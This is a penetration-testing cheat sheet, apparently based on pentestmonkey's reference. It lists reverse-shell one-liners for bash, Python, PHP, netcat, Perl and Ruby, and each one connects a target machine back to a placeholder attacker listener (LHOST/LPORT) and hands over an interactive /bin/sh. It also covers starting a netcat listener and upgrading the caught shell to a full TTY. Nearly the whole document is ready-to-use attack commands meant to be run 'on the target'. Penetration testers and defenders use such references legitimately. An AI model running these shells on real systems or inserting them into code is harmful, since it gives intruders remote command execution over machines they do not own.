# Reverse Shells

Quick reference for reverse shell one-liners across common interpreters. Use whichever language is available on the target.

Replace `LHOST` and `LPORT` with your listener IP and port. Start a listener with `nc -lvnp <LPORT>` before catching the shell.

---

## Bash

```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

---

## Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

---

## PHP

```bash
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

> Uses file descriptor 3. If it doesn't connect, try FD 4, 5, or 6.

---

## Netcat

```bash
# With -e flag (older/traditional builds)
nc -e /bin/sh LHOST LPORT

# Without -e (most modern distros)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT >/tmp/f
```

---

## Perl

```bash
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## Ruby

```bash
ruby -rsocket -e 'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

---

## Shell Upgrade (TTY Stabilization)

After catching a shell, upgrade it to a full TTY:

```bash
# Step 1 — spawn a PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Step 2 — background the shell
Ctrl+Z

# Step 3 — fix terminal settings on your machine
stty raw -echo; fg

# Step 4 — set terminal type inside the shell
export TERM=xterm
```

---

> Source: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
